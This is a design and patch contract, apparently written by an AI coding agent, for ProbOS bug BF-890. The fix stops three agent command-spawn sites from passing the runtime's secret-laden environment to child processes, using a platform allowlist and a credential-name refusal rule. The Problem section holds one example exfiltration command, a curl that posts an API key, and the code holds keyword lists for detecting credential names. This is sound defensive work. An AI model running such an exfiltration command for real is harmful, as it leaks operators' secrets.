# BF-890 -- A command an agent runs starts from an allowlisted environment, not the runtime's (#1529)

**Drafted by:** `claude-architect` (Claude Code, Opus 5.5), 2026-10-14
**Status:** Ready for mechanical install, then tests-only Builders. No new AD or BF number (BF-890 is #1529's own; AD ceiling AD-1333 from `scripts/ad_ceiling.py`, git log + GitHub titles).
**Base:** origin/main `a28fa315`, branch `feat/bf890-20261014-a28fa315`.
**Dependencies:** none. **Estimated tests:** about 60 collected across four new files (parametrised), plus two edited pins.

## Problem

Three spawn sites run command text that an agent or the model supplied, and each hands the child the runtime's whole process environment, which holds every `.env` secret (`__main__.py:3057-3058` `load_dotenv()`), the `GH_TOKEN`/`LLM_API_KEY`/`PROBOS_DISCORD_TOKEN` names `CredentialStore` resolves (`credential_store.py:89-107`) and the `PROBOS_FETCH_TOKEN`/`PROBOS_*_TOKEN` variables (`__main__.py:819-851`, `execution/fetch_broker.py:253`):

1. `RunCommandTool.invoke` -- `src/probos/cognitive/swe_harness/tools.py:1144` `asyncio.create_subprocess_shell(...)`, no `env=`.
2. `ShellCommandAgent._run_sync` -- `src/probos/agents/shell_command.py:214` (PowerShell on win32) and `:220` (`shell=True` on POSIX), no `env=`.
3. **Not named in the issue:** `RedTeamAgent._run_verify_sync` -- `src/probos/agents/red_team.py:380` and `:384` re-runs the SAME command to verify a shell result, no `env=`. Fixing 1 and 2 alone would leave `curl -d "$OPENAI_API_KEY" ...` exfiltrating through the verifier's re-run, and would make every verification of an env-reading command a false "Stdout mismatch".

`run_python`'s sandbox already passes an allowlist: `_ENV_PASSTHROUGH` at `src/probos/execution/isolation.py:642`, read only by `SubprocessSandbox._build_env` (`isolation.py:1039-1041`).

## Decision (ranked options; Delegated Mode, in envelope: strengthens a security control, backward compatible, reverts with git)

| Rank | Option | Correctness | Safety | Compat | Fit | Reversible | Validation |
|---|---|---|---|---|---|---|---|
| **1 (chosen)** | New stdlib-only owner `execution/command_env.py`: sandbox base set + measured per-platform shell set + operator-declared names; `isolation._ENV_PASSTHROUGH` becomes the owner's tuple (same object); config twin pinned by test | high | high | default boots unchanged config; tools keep running (measured) | one owner, no cycles (`execution` is unranked in `tests/test_layer_boundaries.py:16-27`) | git revert; a declared list is ignored after revert (no `extra="forbid"` on `ExecutionConfig`) | moderate |
| 2 | Reuse `isolation._ENV_PASSTHROUGH` unchanged for the shell paths | breaks toolchains: measured, PowerShell cannot resolve `git`; `python` shim installs into cwd | high | **breaks** | simple | yes | low |
| 3 | Inherit, minus a denylist of secret-shaped names (Codex `inherit="all"` + default excludes) | leaks any secret not matching the denylist | medium | high | simple | yes | low |
| 4 | Extend `isolation.py` with the shell sets | as 1 | as 1 | as 1 | puts shell policy in the 1,100-line sandbox module whose prose is text-pinned by five tests | yes | higher |

Choices inside option 1:

- **Owner:** `src/probos/execution/command_env.py` (stdlib only). `isolation.py` imports `SANDBOX_ENV_PASSTHROUGH` and keeps its private name; sandbox behaviour unchanged.
- **Default allowlist:** sandbox base (`PATH SYSTEMROOT WINDIR TEMP TMP LANG LC_ALL TZ`) plus, on `win32`, exactly the 18 names measured below; on other platforms `HOME USER LOGNAME SHELL TERM TMPDIR LC_CTYPE XDG_CONFIG_HOME XDG_CACHE_HOME XDG_DATA_HOME`. Deliberately absent: `SSH_AUTH_SOCK`, `XDG_RUNTIME_DIR`, `DBUS_SESSION_BUS_ADDRESS` (sockets that can hold credentials), `PYTHONPATH`, `VIRTUAL_ENV` (`ShellCommandAgent` already rewrites bare `python` to `sys.executable`, `shell_command.py:196-207`).
- **Config:** `ExecutionConfig.command_env_passthrough: list[str] = Field(default_factory=list)`, validated at parse (trim, dedupe, refuse). One field governs all three sites; no separate `ShellCommandAgent` knob (one operator decision, and the red team must see what the shell agent saw).
- **Credential-name rule** (names only, case-insensitive): refused when the name starts with `PROBOS_` (runtime namespace), contains any of `KEY SECRET TOKEN PASSWORD PASSWD PASSPHRASE CREDENTIAL AUTH COOKIE SESSION PRIVATE`, or has a `_`-separated segment equal to `PAT PASS PWD DSN CREDS`. Any name not matching `[A-Za-z_][A-Za-z0-9_]*` is refused as `unknown_shape` (errs toward refusing). Known false positives accepted: `GIT_AUTHOR_NAME`, `KEYBOARD_*`, `MONKEY`. No regex alternation, so mutation anchors carry no `|`.
- **Unset declared name:** absent from the child (same as an unset allowlisted name); no placeholder, no log.
- **Use-time recheck:** `build_command_env` refuses a credential-shaped declared name again and logs a warning (defence in depth for a constructor caller that bypassed config).
- **Twin:** `config_models/operations.py` may not import `probos` (`tests/test_ad1270e2e_operations_models.py:570-580`); it holds literal twins, and T1 asserts each equals its owner (precedent: `max_runtime_seconds` 300.0 twin, `operations.py:153-154`, `tests/test_ad1246_long_run_units.py:364`).
- **Wiring (constructor injection, no global state):** `RunCommandTool(runtime, *, command_env_passthrough=())` via `register_native_swe_tools(..., command_env_passthrough=...)` from `finalize._wire_native_swe_harness`; `ShellCommandAgent` via the shell pool's spawn kwargs (kept for respawns: `substrate/pool.py:70,210,534,622`, BF-808); `RedTeamAgent` via `runtime._spawn_red_team`.
- **Governed path (DP-13):** a command that needs a credential gets it from the tool's own store in the user profile (the profile variables pass), or from an operator-declared non-secret variable that points at a file; agents in-process use `CredentialStore` (AD-395). Ordinary toolchains keep working (measured below).
- **Rollback:** `git revert`. Configs that never set the field are unaffected; one that set it loads after revert with the key ignored.

## Measured evidence (2026-10-14, Windows 11, `d:/ProbOS/.venv`)

Scratch probe `logs/architect/probe_bf890_env_test.py` (gitignored), run with `pytest -s -n 0`:

| Env | cmd.exe | PowerShell (`-NoProfile`) |
|---|---|---|
| sandbox set only | `git`, `node`, `npm`, `pip`, `dotnet`, `"<sys.executable>" --version` rc 0; bare `python` = Python install manager shim, which **installed Python 3.15 into the working directory** (`./Python/`, ~2,300 files) | `git --version` **fails** ("not recognized"); `Get-Date` ok |
| sandbox + the 18 Windows names | all of the above rc 0; bare `python` = 3.14.3, nothing written | `git`, `npm`, `Get-Date` rc 0 |

POSIX was not run (no POSIX host); its set is chosen from convention and pinned by T3/T4 POSIX tests on CI.

## Sections (install mechanically, in order)

### Section 1 -- NEW `src/probos/execution/command_env.py`

```python
"""BF-890 (#1529): the one owner of the environment a spawned command starts with.

A command an agent or the model asks for -- ``run_command`` in the native SWE
harness, ``ShellCommandAgent``, and the red team's re-run of the same command --
starts from an explicit allowlist instead of inheriting the runtime's process
environment, which holds provider keys and tokens. ``run_python``'s sandbox
(``execution/isolation.py``) uses the narrower base set below.

What this defends: a secret in the runtime's environment being read by a child
through ``echo``, ``set`` or ``env`` and carried into an agent's context.
What it costs: a command that needs a variable outside the allowlist does not
see it unless the operator declares it in ``execution.command_env_passthrough``.
It is not a file boundary: the child runs as the same user and can read the
files that user can read.
"""

from __future__ import annotations

import logging
import os
import re
import sys
from collections.abc import Iterable, Mapping

logger = logging.getLogger(__name__)

#: The ``run_python`` sandbox base set; ``isolation._ENV_PASSTHROUGH`` is this object.
SANDBOX_ENV_PASSTHROUGH: tuple[str, ...] = (
    "PATH", "SYSTEMROOT", "WINDIR", "TEMP", "TMP", "LANG", "LC_ALL", "TZ",
)

#: Measured 2026-10-14 by the BF-890 contract on Windows 11: with only the
#: sandbox set, PowerShell did not resolve ``git`` and the Python install
#: manager's ``python`` shim wrote an interpreter into the working directory.
#: With these names added, both resolved normally.
WINDOWS_COMMAND_EXTRAS: tuple[str, ...] = (
    "COMSPEC", "PATHEXT", "SYSTEMDRIVE", "USERPROFILE", "HOMEDRIVE", "HOMEPATH",
    "APPDATA", "LOCALAPPDATA", "PROGRAMDATA", "PROGRAMFILES", "PROGRAMFILES(X86)",
    "COMMONPROGRAMFILES", "PROCESSOR_ARCHITECTURE", "NUMBER_OF_PROCESSORS", "OS",
    "PSMODULEPATH", "USERNAME", "COMPUTERNAME",
)

#: POSIX toolchains find their own configuration through these. Deliberately
#: absent: SSH_AUTH_SOCK and XDG_RUNTIME_DIR, which lead to agent sockets.
POSIX_COMMAND_EXTRAS: tuple[str, ...] = (
    "HOME", "USER", "LOGNAME", "SHELL", "TERM", "TMPDIR", "LC_CTYPE",
    "XDG_CONFIG_HOME", "XDG_CACHE_HOME", "XDG_DATA_HOME",
)

#: A name containing any of these words is credential-shaped.
CREDENTIAL_NAME_WORDS: tuple[str, ...] = (
    "KEY", "SECRET", "TOKEN", "PASSWORD", "PASSWD", "PASSPHRASE",
    "CREDENTIAL", "AUTH", "COOKIE", "SESSION", "PRIVATE",
)
#: Short forms that count only as a whole ``_``-separated segment, so ``PATH``
#: is not caught by ``PAT``.
CREDENTIAL_NAME_SEGMENTS: tuple[str, ...] = ("PAT", "PASS", "PWD", "DSN", "CREDS")
#: The runtime's own namespace; a command never receives it by declaration.
RUNTIME_NAME_PREFIX: str = "PROBOS_"
#: An operator-declared name must be a plain variable name; any other shape is
#: refused rather than guessed at.
ENV_NAME_SHAPE_PATTERN: str = r"[A-Za-z_][A-Za-z0-9_]*"
# config_models/operations.py holds literal twins of the four values above (it
# may not import probos); tests/test_bf890_command_env.py asserts they agree.

_ENV_NAME_SHAPE_RE = re.compile(ENV_NAME_SHAPE_PATTERN)


def command_env_allowlist(platform: str | None = None) -> tuple[str, ...]:
    """The names a command inherits by default on *platform* (``sys.platform`` when None)."""
    plat = sys.platform if platform is None else platform
    extras = WINDOWS_COMMAND_EXTRAS if plat == "win32" else POSIX_COMMAND_EXTRAS
    return SANDBOX_ENV_PASSTHROUGH + extras


def _is_credential_shaped(name: str) -> bool:
    upper = name.upper()
    if upper.startswith(RUNTIME_NAME_PREFIX):
        return True
    if any(word in upper for word in CREDENTIAL_NAME_WORDS):
        return True
    return any(segment in CREDENTIAL_NAME_SEGMENTS for segment in upper.split("_"))


def env_name_refusal(name: object) -> str | None:
    """Why *name* may not be declared for a command, or ``None`` when it may.

    ``"unknown_shape"`` for anything that is not a plain variable name, and
    ``"credential_shaped"`` for a name the credential rule matches.
    """
    if not isinstance(name, str) or _ENV_NAME_SHAPE_RE.fullmatch(name) is None:
        return "unknown_shape"
    if _is_credential_shaped(name):
        return "credential_shaped"
    return None


def build_command_env(
    declared: Iterable[str] = (),
    *,
    source: Mapping[str, str] | None = None,
    platform: str | None = None,
) -> dict[str, str]:
    """The environment for a command an agent or the model asked for.

    The allowlist for *platform*, plus each *declared* name that
    :func:`env_name_refusal` accepts, each copied from *source*
    (``os.environ`` when None) only when it is set there.
    """
    source_env: Mapping[str, str] = os.environ if source is None else source
    env = {name: source_env[name] for name in command_env_allowlist(platform) if name in source_env}
    for name in declared:
        reason = env_name_refusal(name)
        if reason is not None:
            logger.warning(
                "BF-890: not passing %r to a command (%s); declare a non-secret "
                "variable or use the credential store", name, reason,
            )
            continue
        if name in source_env:
            env[name] = source_env[name]
    return env
```

### Section 2 -- `src/probos/execution/isolation.py`

```text
<<<<<<< SEARCH
from typing import Protocol, runtime_checkable

logger = logging.getLogger(__name__)
=======
from typing import Protocol, runtime_checkable

from probos.execution.command_env import SANDBOX_ENV_PASSTHROUGH

logger = logging.getLogger(__name__)
>>>>>>> REPLACE
```

```text
<<<<<<< SEARCH
# Environment variables kept from the host for a minimal, predictable base env.
_ENV_PASSTHROUGH = ("PATH", "SYSTEMROOT", "WINDIR", "TEMP", "TMP", "LANG", "LC_ALL", "TZ")
=======
# Environment variables kept from the host for a minimal, predictable base env.
# BF-890: one owner, shared with the shell paths (execution/command_env.py).
_ENV_PASSTHROUGH = SANDBOX_ENV_PASSTHROUGH
>>>>>>> REPLACE
```

### Section 3 -- `src/probos/config_models/operations.py`

```text
<<<<<<< SEARCH
from __future__ import annotations

from pydantic import BaseModel, Field, field_validator


class ExecutionConfig(BaseModel):
=======
from __future__ import annotations

import re

from pydantic import BaseModel, Field, field_validator

# BF-890 (#1529): literal twins of probos.execution.command_env's
# CREDENTIAL_NAME_WORDS, CREDENTIAL_NAME_SEGMENTS, RUNTIME_NAME_PREFIX and
# ENV_NAME_SHAPE_PATTERN. This module may not import probos, so
# tests/test_bf890_command_env.py asserts each twin equals its owner.
_CREDENTIAL_ENV_NAME_WORDS = (
    "KEY", "SECRET", "TOKEN", "PASSWORD", "PASSWD", "PASSPHRASE",
    "CREDENTIAL", "AUTH", "COOKIE", "SESSION", "PRIVATE",
)
_CREDENTIAL_ENV_NAME_SEGMENTS = ("PAT", "PASS", "PWD", "DSN", "CREDS")
_RUNTIME_ENV_NAME_PREFIX = "PROBOS_"
_ENV_NAME_SHAPE_PATTERN = r"[A-Za-z_][A-Za-z0-9_]*"


class ExecutionConfig(BaseModel):
>>>>>>> REPLACE
```

```text
<<<<<<< SEARCH
    install_timeout_seconds: float = 180.0  # venv create + pip install is slower

    @field_validator("max_runtime_seconds")
=======
    install_timeout_seconds: float = 180.0  # venv create + pip install is slower
    # BF-890 (#1529): extra environment variable NAMES that a command started by
    # `run_command`, ShellCommandAgent or the red team's re-run may inherit, on
    # top of the built-in allowlist in probos.execution.command_env. The operator
    # sets this; no tool parameter can. A name that is not a plain identifier,
    # starts with PROBOS_, or contains a word in _CREDENTIAL_ENV_NAME_WORDS (or a
    # segment in _CREDENTIAL_ENV_NAME_SEGMENTS) is refused when the config loads.
    # A declared name that is not set is absent from the child. The run_python
    # sandbox does not read this field.
    command_env_passthrough: list[str] = Field(default_factory=list)

    @field_validator("command_env_passthrough")
    @classmethod
    def _declared_env_names_are_plain_and_not_credentials(cls, v: list[str]) -> list[str]:
        names: list[str] = []
        for raw in v:
            name = raw.strip()
            if re.fullmatch(_ENV_NAME_SHAPE_PATTERN, name) is None:
                raise ValueError(
                    f"execution.command_env_passthrough: {raw!r} is not a plain "
                    "environment variable name (letters, digits, underscore)"
                )
            upper = name.upper()
            if (
                upper.startswith(_RUNTIME_ENV_NAME_PREFIX)
                or any(word in upper for word in _CREDENTIAL_ENV_NAME_WORDS)
                or any(part in _CREDENTIAL_ENV_NAME_SEGMENTS for part in upper.split("_"))
            ):
                raise ValueError(
                    f"execution.command_env_passthrough: {name!r} is shaped like a "
                    "credential or is a ProbOS runtime variable, and is never passed "
                    "to a command; declare a non-secret variable instead"
                )
            if name not in names:
                names.append(name)
        return names

    @field_validator("max_runtime_seconds")
>>>>>>> REPLACE
```

### Section 4 -- `src/probos/cognitive/swe_harness/tools.py`

```text
<<<<<<< SEARCH
from typing import Any, TYPE_CHECKING

from probos.execution.workspace_results import (
=======
from typing import Any, TYPE_CHECKING

from probos.execution.command_env import build_command_env
from probos.execution.workspace_results import (
>>>>>>> REPLACE
```

```text
<<<<<<< SEARCH
            "exit_code": {"type": "integer"},
        },
    }

    def __init__(self, runtime: "ProbOSRuntime") -> None:
        self._runtime = runtime

    async def invoke(
=======
            "exit_code": {"type": "integer"},
        },
    }

    def __init__(
        self, runtime: "ProbOSRuntime", *, command_env_passthrough: tuple[str, ...] = (),
    ) -> None:
        self._runtime = runtime
        # BF-890 (#1529): names from execution.command_env_passthrough, injected
        # at registration; input_schema declares no such parameter.
        self._command_env_passthrough: tuple[str, ...] = tuple(command_env_passthrough)

    async def invoke(
>>>>>>> REPLACE
```

```text
<<<<<<< SEARCH
            proc = await _asyncio.create_subprocess_shell(
                str(command),
                stdout=_asyncio.subprocess.PIPE,
                stderr=_asyncio.subprocess.PIPE,
                cwd=cwd,
            )
=======
            proc = await _asyncio.create_subprocess_shell(
                str(command),
                stdout=_asyncio.subprocess.PIPE,
                stderr=_asyncio.subprocess.PIPE,
                cwd=cwd,
                # BF-890 (#1529): an allowlisted environment, not the runtime's.
                env=build_command_env(self._command_env_passthrough),
            )
>>>>>>> REPLACE
```

```text
<<<<<<< SEARCH
def register_native_swe_tools(
    registry: "ToolRegistry", runtime: "ProbOSRuntime"
) -> int:
=======
def register_native_swe_tools(
    registry: "ToolRegistry",
    runtime: "ProbOSRuntime",
    *,
    command_env_passthrough: tuple[str, ...] = (),
) -> int:
>>>>>>> REPLACE
```

```text
<<<<<<< SEARCH
        (EditFileTool(runtime), write_perms),
        (RunCommandTool(runtime), shell_perms),
    ]
=======
        (EditFileTool(runtime), write_perms),
        # BF-890: the operator's declared names (execution.command_env_passthrough).
        (RunCommandTool(runtime, command_env_passthrough=command_env_passthrough), shell_perms),
    ]
>>>>>>> REPLACE
```

### Section 5 -- `src/probos/agents/shell_command.py`

```text
<<<<<<< SEARCH
from probos.substrate.agent import BaseAgent
from probos.types import CapabilityDescriptor, IntentDescriptor, IntentMessage, IntentResult
=======
from probos.execution.command_env import build_command_env
from probos.substrate.agent import BaseAgent
from probos.types import CapabilityDescriptor, IntentDescriptor, IntentMessage, IntentResult
>>>>>>> REPLACE
```

```text
<<<<<<< SEARCH
    # Security constants
    DEFAULT_TIMEOUT: float = 30.0
    MAX_OUTPUT_BYTES: int = 64 * 1024  # 64KB cap on stdout/stderr

    async def handle_intent(self, intent: IntentMessage) -> IntentResult | None:
=======
    # Security constants
    DEFAULT_TIMEOUT: float = 30.0
    MAX_OUTPUT_BYTES: int = 64 * 1024  # 64KB cap on stdout/stderr

    def __init__(self, pool: str = "default", **kwargs: Any) -> None:
        # BF-890 (#1529): names from execution.command_env_passthrough, injected
        # through the shell pool's spawn kwargs.
        self._command_env_passthrough: tuple[str, ...] = tuple(kwargs.pop("command_env_passthrough", ()))
        super().__init__(pool, **kwargs)

    async def handle_intent(self, intent: IntentMessage) -> IntentResult | None:
>>>>>>> REPLACE
```

```text
<<<<<<< SEARCH
    def _run_sync(self, command: str) -> dict[str, Any]:
        """Blocking subprocess execution (called via run_in_executor)."""
        try:
            if sys.platform == "win32":
                args = ["powershell", "-NoProfile", "-Command", command]
                proc = subprocess.Popen(
                    args,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
            else:
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
=======
    def _run_sync(self, command: str) -> dict[str, Any]:
        """Blocking subprocess execution (called via run_in_executor)."""
        try:
            # BF-890 (#1529): an allowlisted environment, not the runtime's.
            env = build_command_env(self._command_env_passthrough)
            if sys.platform == "win32":
                args = ["powershell", "-NoProfile", "-Command", command]
                proc = subprocess.Popen(
                    args,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    env=env,
                )
            else:
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    env=env,
                )
>>>>>>> REPLACE
```

### Section 6 -- `src/probos/agents/red_team.py`

```text
<<<<<<< SEARCH
from probos.agents.http_fetch import safe_fetch_method
from probos.substrate.agent import BaseAgent
=======
from probos.agents.http_fetch import safe_fetch_method
from probos.execution.command_env import build_command_env
from probos.substrate.agent import BaseAgent
>>>>>>> REPLACE
```

```text
<<<<<<< SEARCH
    # Red team agents do NOT subscribe to the normal intent bus.
    # They are invoked directly by the consensus layer.

    async def verify(
=======
    # Red team agents do NOT subscribe to the normal intent bus.
    # They are invoked directly by the consensus layer.

    def __init__(self, pool: str = "default", **kwargs: Any) -> None:
        # BF-890 (#1529): the same declared names the shell agent got, injected
        # by the runtime, so a re-run sees the environment the command saw.
        self._command_env_passthrough: tuple[str, ...] = tuple(kwargs.pop("command_env_passthrough", ()))
        super().__init__(pool, **kwargs)

    async def verify(
>>>>>>> REPLACE
```

```text
<<<<<<< SEARCH
            run_result = await asyncio.wait_for(
                loop.run_in_executor(None, self._run_verify_sync, command),
                timeout=5.0,
            )
=======
            run_result = await asyncio.wait_for(
                loop.run_in_executor(
                    None, self._run_verify_sync, command,
                    build_command_env(self._command_env_passthrough),
                ),
                timeout=5.0,
            )
>>>>>>> REPLACE
```

```text
<<<<<<< SEARCH
    @staticmethod
    def _run_verify_sync(command: str) -> tuple[int, str] | None:
        """Blocking subprocess for verification (called via run_in_executor)."""
        try:
            if sys.platform == "win32":
                args = ["powershell", "-NoProfile", "-Command", command]
                proc = subprocess.Popen(
                    args, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                )
            else:
                proc = subprocess.Popen(
                    command, shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                )
=======
    @staticmethod
    def _run_verify_sync(command: str, env: dict[str, str] | None) -> tuple[int, str] | None:
        """Blocking subprocess for verification (called via run_in_executor)."""
        try:
            if sys.platform == "win32":
                args = ["powershell", "-NoProfile", "-Command", command]
                proc = subprocess.Popen(
                    args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env,
                )
            else:
                proc = subprocess.Popen(
                    command, shell=True, env=env,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                )
>>>>>>> REPLACE
```

### Section 7 -- `src/probos/startup/agent_fleet.py`

```text
<<<<<<< SEARCH
    for pool_name, agent_type, size in _builtin_pools:
        ids = generate_pool_ids(agent_type, pool_name, size)
        await create_pool_fn(pool_name, agent_type, target_size=size, agent_ids=ids)
=======
    # BF-890 (#1529): the operator's declared names reach every shell agent,
    # including one a pool respawns, through the pool's spawn kwargs (BF-808).
    execution_cfg = getattr(config, "execution", None)
    shell_env_names: tuple[str, ...] = (
        tuple(execution_cfg.command_env_passthrough) if execution_cfg is not None else ()
    )
    for pool_name, agent_type, size in _builtin_pools:
        ids = generate_pool_ids(agent_type, pool_name, size)
        shell_kwargs: dict[str, Any] = (
            {"command_env_passthrough": shell_env_names}
            if agent_type == "shell_command"
            else {}
        )
        await create_pool_fn(pool_name, agent_type, target_size=size, agent_ids=ids, **shell_kwargs)
>>>>>>> REPLACE
```

### Section 8 -- `src/probos/runtime.py`

```text
<<<<<<< SEARCH
            agent_id = generate_agent_id("red_team_verifier", "red_team", i)
            agent = RedTeamAgent(pool="red_team", agent_id=agent_id)
            await self.registry.register(agent)
=======
            agent_id = generate_agent_id("red_team_verifier", "red_team", i)
            # BF-890 (#1529): the red team re-runs a command with the same
            # allowlisted environment the shell agent used.
            agent = RedTeamAgent(
                pool="red_team", agent_id=agent_id,
                command_env_passthrough=tuple(self.config.execution.command_env_passthrough),
            )
            await self.registry.register(agent)
>>>>>>> REPLACE
```

### Section 9 -- `src/probos/startup/finalize.py`

```text
<<<<<<< SEARCH
        count = register_native_swe_tools(registry, runtime)
        if cfg.blocked_paths:
            tool_executor.add_pre_hook(make_blocked_paths_hook(cfg.blocked_paths))
=======
        count = register_native_swe_tools(
            registry, runtime,
            command_env_passthrough=tuple(config.execution.command_env_passthrough),
        )
        if cfg.blocked_paths:
            tool_executor.add_pre_hook(make_blocked_paths_hook(cfg.blocked_paths))
>>>>>>> REPLACE
```

### Section 10 -- `tests/test_ad1270e2e_operations_models.py`

```text
<<<<<<< SEARCH
        "allow_package_install": False,
        "pip_index_url": "https://pypi.org/simple",
        "install_timeout_seconds": 180.0,
    },
=======
        "allow_package_install": False,
        "pip_index_url": "https://pypi.org/simple",
        "install_timeout_seconds": 180.0,
        # BF-890: operator-declared command environment names (none by default).
        "command_env_passthrough": [],
    },
>>>>>>> REPLACE
```

### Section 11 -- `tests/test_ad1270e1_config_facade.py`

```text
<<<<<<< SEARCH
    # AD-1326 adds the eight dreaming.procedure_challenger_* fields (1844 -> 1852).
    assert counts["field_definitions"] == 1852  # AD-1206 intentionally adds github_repository.
=======
    # AD-1326 adds the eight dreaming.procedure_challenger_* fields (1844 -> 1852).
    # BF-890 adds execution.command_env_passthrough (1852 -> 1853).
    assert counts["field_definitions"] == 1853  # AD-1206 intentionally adds github_repository.
>>>>>>> REPLACE
```

### Section 12 -- `docs/development/config-reference.md`

```text
<<<<<<< SEARCH
| `install_timeout_seconds` | `float` | `180.0` | — |  |

## `protected_execution`
=======
| `install_timeout_seconds` | `float` | `180.0` | — |  |
| `command_env_passthrough` | `list[str]` | `[]` | — |  |

## `protected_execution`
>>>>>>> REPLACE
```

### Section 13 -- `DECISIONS.md`

```text
<<<<<<< SEARCH
## Era V — Civilization (Phases 31-36)

### AD-1326 -- A FIX procedure rewrite keeps its champion until a challenger wins head-to-head (2026-10-13, #1510)
=======
## Era V — Civilization (Phases 31-36)

### BF-890 -- A command an agent runs starts from an allowlisted environment, not the runtime's (2026-10-14, #1529)

- *Scope.* Three sites run command text an agent or the model supplied: `run_command` (`RunCommandTool`), `ShellCommandAgent`, and the red team's re-run of the same command (not named in the issue; left alone it would still hand a re-run every secret). Each now passes `env=build_command_env(...)` from `probos/execution/command_env.py`; before, each inherited the runtime's environment, into which `.env` is loaded at startup. The `run_python` sandbox's tuple is now that module's `SANDBOX_ENV_PASSTHROUGH` (`isolation._ENV_PASSTHROUGH` is the same object); its behaviour is unchanged.
- *Allowlist.* The sandbox set plus, on Windows, 18 names measured necessary (with the sandbox set alone PowerShell did not resolve `git`, and the Python install manager's `python` shim installed an interpreter into the working directory); on POSIX, `HOME`, `USER`, `LOGNAME`, `SHELL`, `TERM`, `TMPDIR`, `LC_CTYPE` and the XDG config, cache and data directories. Not `SSH_AUTH_SOCK` or `XDG_RUNTIME_DIR`. Rejected: the sandbox set alone (breaks ordinary toolchains), inherit-minus-denylist (leaks any secret the denylist misses), extending `isolation.py` (sandbox prose is text-pinned).
- *Operator extension.* `execution.command_env_passthrough` (names, default empty), read at startup and injected into all three sites by constructor; no tool parameter can set it. A name that is not a plain identifier, starts with `PROBOS_`, contains a credential word (KEY, SECRET, TOKEN, PASSWORD, PASSWD, PASSPHRASE, CREDENTIAL, AUTH, COOKIE, SESSION, PRIVATE) or has a segment PAT, PASS, PWD, DSN or CREDS is refused when the config loads and again where the environment is built. A declared name that is not set is absent. Names only: a value is never inspected. Rejected: assigning values in config (secrets in config), a separate shell-agent knob (the red team must see what the agent saw).
- *Twin.* `config_models/operations.py` may not import `probos`, so it holds literal twins of the rule; a test asserts they equal the owner.
- *Not a file boundary.* The child runs as the same user and can read that user's files, `.env` included; command policy is AD-1328 (#1530). Model-authored code run outside the sandbox (`cognitive/builder.py` `_run_tests`, `InProcessContainerSandbox`, dependency installs) still inherits the full environment; recorded for follow-up.
- Contract `prompts/bf-890-command-environment-allowlist.md`.

### AD-1326 -- A FIX procedure rewrite keeps its champion until a challenger wins head-to-head (2026-10-13, #1510)
>>>>>>> REPLACE
```

### Section 14 -- `PROGRESS.md`

```text
<<<<<<< SEARCH
# ProbOS Progress

=======
# ProbOS Progress

**BF-890 (2026-10-14), #1529 -- a command an agent runs no longer inherits the runtime's environment; no new AD or BF number.** `run_command` (`RunCommandTool`), `ShellCommandAgent` and the red team's re-run of the same command start their child from `build_command_env` in the new `src/probos/execution/command_env.py`: the `run_python` sandbox's base set (that module's `SANDBOX_ENV_PASSTHROUGH`, the object `isolation._ENV_PASSTHROUGH` now names) plus the platform variables a shell and ordinary toolchains need, plus any names the operator declares in `execution.command_env_passthrough` (default empty). A declared name that is not a plain identifier, starts with `PROBOS_` or is shaped like a credential is refused when the config loads and again where the environment is built. It is not a file boundary: the child still runs as the same user. Tests: `tests/test_bf890_command_env.py`, `tests/test_bf890_config.py`, `tests/test_bf890_run_command_env.py`, `tests/test_bf890_shell_agent_env.py`. See DECISIONS.md, "BF-890".

>>>>>>> REPLACE
```

## Regeneration after install (orchestrator, in order)

```
d:/ProbOS/.venv/Scripts/python.exe scripts/check_config_facade.py --update-baseline
d:/ProbOS/.venv/Scripts/python.exe scripts/check_config_facade.py --check
d:/ProbOS/.venv/Scripts/python.exe scripts/gen_config_reference.py --check
d:/ProbOS/.venv/Scripts/python.exe scripts/check_config_profiles.py --check
d:/ProbOS/.venv/Scripts/python.exe scripts/check_architecture_principles.py --check
d:/ProbOS/.venv/Scripts/python.exe scripts/gen_ad_ledger.py
d:/ProbOS/.venv/Scripts/python.exe scripts/gen_ad_ledger.py --check
```

`--update-baseline` rewrites `docs/development/config-facade-baseline.yaml` (expected diff: `field_definitions` 1852 -> 1853, `canonical_dump_leaves`, `canonical_dump_sha256`, `schema_sha256` of `ExecutionConfig` and `SystemConfig`, one appended `command_env_passthrough` field row); review that diff, nothing else should move. If `gen_config_reference.py --check` fails, Section 12's row is wrong: regenerate with `scripts/gen_config_reference.py` and diff. `check_config_profiles.py` is expected unchanged (it classifies bool flags; this is a list).

## Hidden pins (enumerated, with the command that found each)

| Pin | Command | Handling |
|---|---|---|
| `EXPECTED_DUMPS["ExecutionConfig"]` | `Grep "install_timeout_seconds" tests/test_ad1270e2e_operations_models.py` -> :152 | Section 10 |
| facade baseline fields and hashes | `Grep "ExecutionConfig:" docs/development/config-facade-baseline.yaml` -> :1771 | `--update-baseline` |
| facade field count | `Grep "field_definitions\"\] ==" tests/test_ad1270e1_config_facade.py` -> :1550 | Section 11 |
| config reference row | `Grep "install_timeout_seconds" docs/development/config-reference.md` -> :536 | Section 12 + `--check` |
| `operations.py` imports no `probos` | `tests/test_ad1270e2e_operations_models.py:570-580` (ast.walk) | twins; `import re` is stdlib (precedent `config_models/agentic.py:12`) |
| ordered fields seen by `CodebaseIndex` | `tests/test_ad1270e2e_operations_models.py:371-385` | field appended last, annotated assignment |
| config/isolation prose bans | `tests/test_bf781_isolation_claims.py:80-230`, `tests/test_bf763_execution_claims.py:47,275` | new text avoids every banned phrase; `command_env.py` never mentions `default_tier` (`test_the_field_really_has_no_execution_consumer`) |
| `_build_env` source text | `tests/test_ad1233_sandbox_network_posture.py:33,65,76` | `_build_env` untouched |
| shell `Popen` mocks | `Grep "probos.agents.shell_command.subprocess.Popen" tests/test_expansion_agents.py` -> :211,229,651,708,751 (`return_value=` only, no `call_args`) | `env=` kwarg accepted |
| real `run_command` child | `tests/test_ad544_native_tools.py:173-187` (`sys.executable -c`) | still runs under the allowlist |
| tool schema golden | `tests/test_ad1179_tool_schema_golden.py:137`, `tests/fixtures/ad1179_tool_definition_golden.json` | `input_schema` unchanged |
